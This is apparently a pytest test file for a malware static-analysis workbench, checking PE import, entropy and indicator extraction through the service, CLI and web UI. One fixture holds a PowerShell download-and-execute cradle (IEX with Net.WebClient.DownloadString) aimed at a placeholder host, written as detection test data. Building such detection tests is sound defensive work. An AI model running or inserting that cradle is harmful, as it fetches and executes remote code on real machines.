import json
import sys
from pathlib import Path

import pytest

from loader_detection_workbench.artifact.service import ArtifactService
from loader_detection_workbench.case.service import CaseService
from loader_detection_workbench.cli import main
from loader_detection_workbench.project.service import ProjectService
from loader_detection_workbench.static_analysis.service import StaticAnalysisService
from loader_detection_workbench.web import create_app

sys.path.insert(0, str(Path(__file__).parents[1] / "unit"))
from test_static_features import synthetic_pe_with_imports  # noqa: E402


def _workspace(tmp_path: Path) -> Path:
    root = tmp_path / "project"
    ProjectService().create(root, "Static v2")
    CaseService(root).create("Synthetic PE", "simulator")
    return root


def test_v2_result_round_trip_cli_and_ui(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    root = _workspace(tmp_path)
    source_path = tmp_path / "synthetic.exe"
    source_path.write_bytes(
        synthetic_pe_with_imports() + b"C:\\Users\\someone\\stage\\drop.exe\0"
    )
    source = ArtifactService(root).add("CASE-0001", source_path, "sample")

    result = StaticAnalysisService(root).analyze(
        "CASE-0001", source.artifact_id.display_id
    )

    assert result.schema_version == 2
    assert result.tool_name == "workbench-pe"
    assert result.imports[0].dll == "KERNEL32.dll"
    assert result.imphash is not None
    assert result.sections[0].entropy is not None
    assert result.sections[0].writable is True
    assert "notable_imports:LoadLibraryA,VirtualAlloc" in result.flags
    assert result.indicators["url"] == ("http://example.invalid/stage2",)
    assert result.overlay_size > 0

    shown = StaticAnalysisService(root).show(
        "CASE-0001", result.artifact.artifact_id.display_id
    )
    assert shown == result

    monkeypatch.chdir(root)
    assert main(["case", "static", "analyze", "CASE-0001", "ART-000001"]) == 0
    output = capsys.readouterr().out
    assert f"imphash: {result.imphash}" in output
    assert "imports: 1 dlls / 2 functions" in output
    assert "indicator.url: 1" in output

    client = create_app(root).test_client()
    page = client.get(
        f"/cases/CASE-0001/artifacts/{result.artifact.artifact_id.display_id}",
        headers={"Host": "127.0.0.1:8080"},
    ).get_data(as_text=True)
    assert "KERNEL32.dll" in page
    assert "VirtualAlloc" in page
    assert "http://example.invalid/stage2" in page
    assert "악성 여부 판정이 아닙니다" in page
    assert "someone" not in page  # windows_path values stay out of the UI


def test_v1_results_remain_readable(tmp_path: Path) -> None:
    root = _workspace(tmp_path)
    legacy = {
        "schema_version": 1,
        "source": {"artifact_id": "ART-000001", "sha256": "0" * 64, "size_bytes": 4},
        "analyzer": {
            "name": "workbench-pe-minimal",
            "version": "1",
            "analyzed_at": "2026-10-24T00:00:00Z",
        },
        "status": "not_pe",
        "is_pe": False,
        "pe": {
            "architecture": None,
            "machine": None,
            "optional_header": None,
            "characteristics": None,
            "sections": [],
        },
        "error": None,
    }
    path = tmp_path / "legacy.json"
    path.write_text(json.dumps(legacy), encoding="utf-8")
    artifact = ArtifactService(root).add("CASE-0001", path, "static")

    result = StaticAnalysisService(root).show(
        "CASE-0001", artifact.artifact_id.display_id
    )

    assert result.schema_version == 1
    assert result.imports == ()
    assert result.flags == ()


def test_non_pe_still_gets_strings_and_entropy(tmp_path: Path) -> None:
    root = _workspace(tmp_path)
    script = tmp_path / "script.txt"
    script.write_bytes(
        b"IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/a')"
    )
    source = ArtifactService(root).add("CASE-0001", script, "sample")

    result = StaticAnalysisService(root).analyze(
        "CASE-0001", source.artifact_id.display_id
    )

    assert result.status == "not_pe"
    assert result.flags == ()
    assert result.file_entropy and result.file_entropy > 3
    assert "downloadstring" in [v.lower() for v in result.indicators["script_keyword"]]
